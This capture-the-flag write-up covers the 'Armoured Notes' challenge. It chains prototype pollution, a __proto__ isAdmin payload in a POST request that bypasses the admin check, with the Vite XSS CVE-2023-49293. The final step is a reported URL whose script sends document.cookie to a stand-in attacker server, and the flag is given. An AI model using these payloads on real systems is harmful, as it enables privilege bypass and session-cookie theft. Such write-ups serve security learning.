### Armoured Notes

We are give source code to this app. Having a report endpoint, it has to be XSS.

After surfing through the code and trying to create a post for hours, I slept to free myself.

Then coming with a fresh mind, I took a look at the package.json and using the vitejs version `"vite": "^4.4.0"`, I googled for vitejs 4.4.0 vunerabilities and came across CVE-2023-49293.

https://nvd.nist.gov/vuln/detail/CVE-2023-49293

https://github.com/advisories/GHSA-92r3-m2mg-pj97

Reading up on it, we get that our app is vulnerable by its version and its appType set to custom. The exploit is `"></script><script>alert('boom')</script>` used as a http query param, but we needed a inline script starting with `<script type="module">` tag, since this is where the vulnerability lies.

After checking the views, we see that only post.html is vulnerable, which means we need to create a post to exploit this. We can also get a postid, but it is a 24 character hex string, so no way we are bruteforcing that.

Below is the code for the post creation: -

```js
app.post("/create", async (req, res, next) => {
    let obj = duplicate(req.body);

    if (obj.uname === "admin" && obj.pass == process.env.PASSWORD) {
      obj.isAdmin = true;
    }
    if (obj.isAdmin) {
      const newEntry = req.body;

      try {
        const result = await diaryCollection.insertOne(newEntry);
        return res.json({ code: result.insertedId });
      } catch (err) {
        console.error("Failed to insert entry", err);
        return res.status(500).json({ code: "err" });
      }
    }
    return res.json({ code: "err" });
  });
```
```js
export function duplicate(body) {
    let obj={}
    let keys = Object.keys(body);
    keys.forEach((key) => {
      if(key !== "isAdmin")
      obj[key]=body[key];
    })
    return obj;
  }
```

Going through the above code, we realize that if we even supply a "isAdmin" param during post creation, it will just be ignoredduring duplication.

>JavaScript, is a prototype-based object-oriented programming language. Each object is linked to a “prototype”. When we invoke the toString method on an object, JavaScript will first check to see if we explicitly defined the method for the given object. If we haven’t, it will look for its definition on the object’s prototype.

Reading up on prototype pollution, we realize we can supply our own "isAdmin" in the objects prototype and when the check is run, it will pass. Below is my request: -

```
POST /create HTTP/1.1
Host: 34.132.132.69:8001
User-Agent: useragent
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://34.132.132.69:8001/
Content-Type: application/json
Content-Length: 80
Origin: http://34.132.132.69:8001/
DNT: 1
Sec-GPC: 1
Connection: close

{"__proto__": {"isAdmin": true},"uname":"admin","pass":"ds","message":"my note"}
```

Using the above method, we are able to create a post and we recieve the postID.

Then we just report the postID with the exploit to send a server we control the cookie.

Reported URL: -

```
http://34.132.132.69:8001/posts/postIDxxxx/?"></script><script>document.location="https://serverwecontrol.lol/?q="+document.cookie;</script>
```

### Flag

`flag{pR0707yP3_p0150n1n9_AND_v173j5_5ay_n01c3_99}`

### Further Reading

https://learn.snyk.io/lesson/prototype-pollution/
https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks
https://medium.com/intrinsic-blog/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96
https://portswigger.net/web-security/prototype-pollution
